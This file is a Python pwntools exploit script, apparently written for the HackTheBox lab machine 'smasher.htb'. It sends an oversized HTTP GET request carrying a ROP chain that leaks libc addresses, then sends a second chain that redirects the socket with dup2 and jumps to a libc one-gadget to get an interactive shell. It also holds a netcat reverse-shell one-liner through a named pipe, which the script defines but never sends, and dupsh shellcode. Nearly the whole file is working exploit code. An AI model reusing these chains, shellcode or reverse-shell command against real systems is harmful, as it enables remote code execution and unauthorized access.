#/usr/bin/python

from pwn import *

import urllib

binary = "remote_tiny"
host, port = "smasher.htb", 1111
libc_binary = "libc6_2.23-0ubuntu10_amd64.so"

DEBUG = False

context.log_level = "DEBUG"
context.bits = 64

if DEBUG:
    host, port = "localhost", 1111

e = ELF(binary)
proc = None

gdbscript = """
b*0x401eb0
b*0x6031a4
b*0x00603160
b*0x60318a
c
"""
# Above breakpoint for shellcode

def getpipe():
    if DEBUG:
        proc = process([binary,'1111'])
        gdb.attach(proc.pid,gdbscript=gdbscript)
        return remote(host, port)
    return remote(host, port)

def getlibc():
    if DEBUG:
        if context.bits == 32:
            return ELF("/lib/i386-linux-gnu/libc.so.6")
        else:
            return ELF("/lib/x86_64-linux-gnu/libc.so.6")
    return ELF(libc_binary)


#.data section address to shortcut exploit.
shellcode_addr = 0x00603160
shellcode = asm(shellcraft.amd64.linux.dupsh(sock=4))

libc = getlibc()
p = getpipe()

def t(n):
    return urllib.quote(p64(n))

""" Stage 1! """
#rop = t(0x4011dd) # pop rdi; ret
""" Write to leak libc address. """
""" r12->edi, rbp->esi, rbx -> rdx, then write """
rop = t(0x401102) # pop rbx; pop rbp; pop r12; pop r13
rop += t(0x8) # rbx, payload size
rop += t(e.got['read']) # rbp, void*buf
rop += t(0x4) # r12, fd
rop += t(0xdeadc0dedeadc0de) # Goes into rax at next ret
rop += t(0x4010e0) # Translate to write
rop += t(0xdeadc0dedeadc0de) # Pad
rop += t(0x8) # rbx
rop += t(e.got['write']) # rbp
rop += t(0x4) # r12
rop += t(0xdeadc0dedeadc0de) #r13
rop += t(0x4010e0) # Another write, to leak write. 

#.data section address. Cuz no NX, shellcode should be here. :)

data = "\x47\x45\x54\x20/../" + "A" * (600-0x23) 
data += rop
data += "\r\n"
data += "\x48\x6f\x73\x74\x3a\x20\x73\x6d\x61\x73\x68\x65\x72\x2e\x68\x74" \
"\x62\x3a\x31\x31\x31\x31\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65" \
"\x6e\x74\x3a\x20\x63\x75\x72\x6c\x2f\x37\x2e\x35\x38\x2e\x30\x0d" \
"\x0a\x41\x63\x63\x65\x70\x74\x3a\x20\x2a\x2f\x2a\x0d\x0a\x0d\x0a"

time.sleep(0.5)

p.send(data)

p.recvuntil('File not found')

libc_read_leak = p.recv(8)
libc_read_leak = unpack(libc_read_leak, word_size=64)
libc_write_leak = p.recv(8)
libc_write_leak = unpack(libc_write_leak, word_size=64)

print "read:",hex(libc_read_leak)
print "write:", hex(libc_write_leak)

libc_base = libc_read_leak - libc.symbols['read']
print "libc@", hex(libc_base)

p.close()

"""What feels really cool about this is that the forking behavior seems to give
us a moment in getting a leak first, and then abusing the leak to ROP
ourselves into a shell.

So, we assume that a new fork server hasn't been spun up yet...
"""

""" Stage 2! """

# Remote libc gadgets
magic_gadget = 0xf02a4
pop_rdi_ret = 0x21102
pop_rdx_pop_rsi_ret = 0x1150c9

if DEBUG:
    magic_gadget = 0x4f322
    pop_rdi_ret = 0x2155f
    pop_rdx_pop_rsi_ret = 0x1306d9

command_payload = " mkfifo /tmp/f &&cat /tmp/f|/bin/sh -i 2>&1|nc.openbsd -l 10.10.13.9 4442 >/tmp/f;"

#If this doesn't work, back to magic gadget!

#These gagdets below seem to work, but being lazy with shellcode ain't working. :/
rop = ""
rop += t(libc_base + pop_rdi_ret)
rop += t(0x4)
rop += t(libc_base + pop_rdx_pop_rsi_ret)
rop += t(shellcode_addr)
rop += t(0)
rop += t(libc_base + libc.symbols['dup2'])
rop += t(libc_base + pop_rdi_ret)
rop += t(0x4)
rop += t(libc_base + pop_rdx_pop_rsi_ret)
rop += t(shellcode_addr)
rop += t(1)
rop += t(libc_base + libc.symbols['dup2'])
rop += t(libc_base + pop_rdi_ret)
rop += t(0x4)
rop += t(libc_base + pop_rdx_pop_rsi_ret)
rop += t(shellcode_addr)
rop += t(2)
rop += t(libc_base + libc.symbols['dup2'])
rop += t(libc_base + magic_gadget)
# Padd to get magic gadgets working
rop += t(0) * (2 * 10)

data = "\x47\x45\x54\x20/../" + "A" * (600-0x23) 
data += rop
data += "\r\n"
data += "\x48\x6f\x73\x74\x3a\x20\x73\x6d\x61\x73\x68\x65\x72\x2e\x68\x74" \
"\x62\x3a\x31\x31\x31\x31\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65" \
"\x6e\x74\x3a\x20\x63\x75\x72\x6c\x2f\x37\x2e\x35\x38\x2e\x30\x0d" \
"\x0a\x41\x63\x63\x65\x70\x74\x3a\x20\x2a\x2f\x2a\x0d\x0a\x0d\x0a"

if DEBUG:
    print "Should now attach to the second process in debugger if possible."
    raw_input("Good?")
else:
    time.sleep(0.1)

p = remote(host, port)
p.send(data)
p.recv()

# Remember: python -c 'import pty; pty.spawn("/bin/sh")'
p.interactive()
